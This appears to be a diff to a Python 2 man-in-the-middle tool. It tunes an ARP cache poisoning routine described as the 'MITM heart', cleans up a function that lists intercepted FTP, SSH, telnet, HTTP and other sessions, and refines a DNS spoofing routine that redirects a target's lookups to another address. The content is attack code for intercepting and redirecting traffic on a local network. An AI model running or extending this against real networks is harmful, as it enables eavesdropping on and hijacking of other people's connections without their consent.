@@ -25,7 +25,7 @@ from threading import Thread
 from socket import *
 from utils import *
 
-def poison(dev, source_mac, source, target):
+def poison(dev, source_mac, source, target, delay = 5):
 	"""
 	poison arp cache of target and router, causing all traffic between them to
 	pass inside our machine, MITM heart
@@ -178,45 +178,40 @@ def get_sessions(dev, target, port = 0):
 					if sess not in sessions:
 						sessions.append(sess)
 						if tcp.sport == 21 or tcp.dport == 21:
-							# sessions.insert(session, ' ftp-data session')
 							sess += ' ftp-data session'
 						elif tcp.sport == 22 or tcp.dport == 22:
-							# sessions.insert(session, ' ssh session')
 							sess += ' ssh session'
 						elif tcp.sport == 23 or tcp.dport == 23:
-							# sessions.insert(session, ' telnet session')
 							sess += ' telnet session'
 						elif tcp.sport == 25 or tcp.dport == 25:
-							# sessions.insert(session, ' SMTP session')
 							sess += ' SMTP session'
 						elif tcp.sport == 80 or tcp.dport == 80:
-							# sessions.insert(session, ' HTTP session')
 							sess += '\t HTTP session'
 						elif tcp.sport == 110 or tcp.dport == 110:
-							# sessions.insert(session, ' POP3 session')
 							sess += ' POP3 session'
 						elif tcp.sport == 443 or tcp.dport == 443:
-							# sessions.insert(session, ' SSL session')
 							sess += '\t SSL session'
 						print " [{0}] {1}".format(session, sess)
 						session += 1
-						# print sess
+
 	except KeyboardInterrupt:
 		print '[+] Session scan interrupted\n\r'
 
-def dns_spoof(dev, source_mac, source, target=None, host=None, redirection=None):
+def dns_spoof(dev, source_mac, source, target = None, host = None, redirection = None):
 
 		redirection = gethostbyname(redirection)
 		sock = dnet.ip()
 		filter = 'udp dst port 53'
+		if target:
+			filter += ' and src %s' % target
 		print '[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W + ' and ' + R + target + W
 		# need to create a daemon that continually poison our target
-		thread = Thread(target = poison, args = (dev, source_mac, source, target,))
+		thread = Thread(target = poison, args = (dev, source_mac, source, target, 2, ))
 		thread.daemon = True
 		thread.start()
 		pc = pcap.pcap(dev)
 		pc.setfilter(filter)
-		print '[+] Redirecting ' + G + host + W + ' to ' + G + redirection + G + ' for ' + R + target + W
+		print '[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R + target + W
 		try:
 			for ts, pkt in pc:
 				eth = dpkt.ethernet.Ethernet(pkt)
@@ -267,11 +262,9 @@ def dns_spoof(dev, source_mac, source, target=None, host=None, redirection=None)
 				print inet_ntoa(ip.src)
 
 				buf = dnet.ip_checksum(str(ip))
-				# buf = config.checksum(str(ip))
 				sock.send(buf)
 
 		except KeyboardInterrupt:
 			print '[+] DNS spoofing interrupted\n\r'
 			set_ip_forward(0)
-			sys.exit()
 
